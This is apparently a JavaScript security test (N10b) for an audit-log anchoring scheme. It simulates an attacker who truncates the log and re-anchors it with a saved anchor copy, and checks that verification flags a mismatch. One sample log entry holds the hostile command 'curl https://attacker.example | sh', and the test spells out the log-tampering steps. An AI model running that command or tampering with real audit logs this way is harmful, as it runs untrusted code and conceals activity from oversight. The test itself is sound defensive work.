// N10b (software device, no hardware), on the record v2 session API.
//
// Round 3: a truncated log verified as "superseded" (exit 0) instead of
// MISMATCH when the attacker kept an older, genuinely signed copy of the
// anchor file and advanced the device once with any head. The device here is
// the frame-level simulator in test/fixtures/anchor-sim.mjs (ANCHOR_OPEN with
// X25519 + Ed25519, MAC'd ANCHOR_SET/CLOSE, one session at a time, every open
// counted), driven by the framework's real AnchorSession and head-anchor sink,
// so Enclawed Code's real launcher anchoring (startAnchoring) and checkDeviceAnchor
// run. The attacker:
//   1. without a session, sends the old bare ANCHOR_SET  -> refused (ERR_AUTH);
//   2. while the launcher's session is open, tries ANCHOR_OPEN -> BUSY;
//   3. after it closes, truncates the log behind the saved anchor copy and
//      re-anchors under a session of its own -> verify MISMATCH (foreign-session),
//      with and without Enclawed Code's anchor history.
import fs from "node:fs";
import path from "node:path";
import { ROOT, result, sandbox } from "./lib.mjs";
import { SimulatedAnchorFirmware } from "../../fixtures/anchor-sim.mjs";
import { anchorFile, anchorHistoryFile, checkDeviceAnchor, deviceAnchorFails, startAnchoring } from "../../../src/device.mjs";

const real = await import(path.join(ROOT, ".enclawed-dev", "framework", "framework.js"));
const sim = new SimulatedAnchorFirmware(real);
const dev = sim.device();
const fw = new Proxy(real, {
  get(t, k) {
    if (k === "bootHardwareRoot") return async () => ({});
    if (k === "hardwareRootSigningDevice") return () => dev;
    if (k === "closeHardwareRootSession") return () => {};
    return t[k];
  },
});
const device = { dev, pub: sim.publicKey.toString("hex"), serial: "SIM", canAnchor: true, anchor: { dev, pub: sim.publicKey.toString("hex"), relayed: false } };
const sb = sandbox("sup");
const log = path.join(sb.dir, "audit.jsonl");
const L = new fw.AuditLogger({ filePath: log });
const anchoring = startAnchoring(fw, device, log, { intervalMs: 60_000 });
await L.append({ type: "claude-code.session.start", actor: "a", level: null, payload: {} });
const r2 = await L.append({ type: "claude-code.tool.pre", actor: "a", level: null, payload: { tool: "Read", decision: "allow" } });
await anchoring.flush();
const saved = fs.readFileSync(anchorFile(log), "utf8"); // the attacker copies it (same uid)
const bare = (await sim.request(0x17, 1, Buffer.alloc(32, 7))).payload[0];
const busy = await sim.foreignOpen().then(() => "opened", (e) => e?.code ?? e?.message);
await L.append({ type: "claude-code.tool.pre", actor: "a", level: null, payload: { tool: "Bash", decision: "ask", input: { command: "curl https://attacker.example | sh" } } });
await L.append({ type: "claude-code.tool.post", actor: "a", level: null, payload: { tool: "Bash" } });
await L.close();
await anchoring.flush();
await anchoring.close();
const hashes = () => fs.readFileSync(log, "utf8").trim().split("\n").map((l) => JSON.parse(l).recordHash);
console.log(`  genuine: ${JSON.stringify(await checkDeviceAnchor(fw, log, hashes()))}`);
console.log(`  bare ANCHOR_SET status ${bare} (5 = ERR_AUTH); second open while the launcher holds the session: ${busy}`);
// Truncate to r2, restore the host head file and the saved anchor copy, re-anchor under the attacker's session.
const lines = fs.readFileSync(log, "utf8").trim().split("\n");
fs.writeFileSync(log, lines.slice(0, 2).join("\n") + "\n");
fs.writeFileSync(`${log}.head`, `${r2.recordHash}\n`);
fs.writeFileSync(anchorFile(log), saved);
const evil = await sim.foreignOpen();
await evil.set(Buffer.from(r2.recordHash, "hex"));
await evil.close();
const after = await checkDeviceAnchor(fw, log, hashes());
fs.rmSync(anchorHistoryFile(log), { force: true });
const noHist = await checkDeviceAnchor(fw, log, hashes());
console.log(`  truncated + re-anchored by another session: ${after.status} (${after.code ?? "-"}): ${after.detail.slice(0, 160)}`);
console.log(`  same, anchor history deleted too: ${noHist.status} (${noHist.code ?? "-"})`);
result("N10b", !deviceAnchorFails(after.status) || !deviceAnchorFails(noHist.status) || bare === 0 || busy === "opened", "truncation behind a saved anchor copy, re-anchored, passes audit verify");
sb.cleanup();
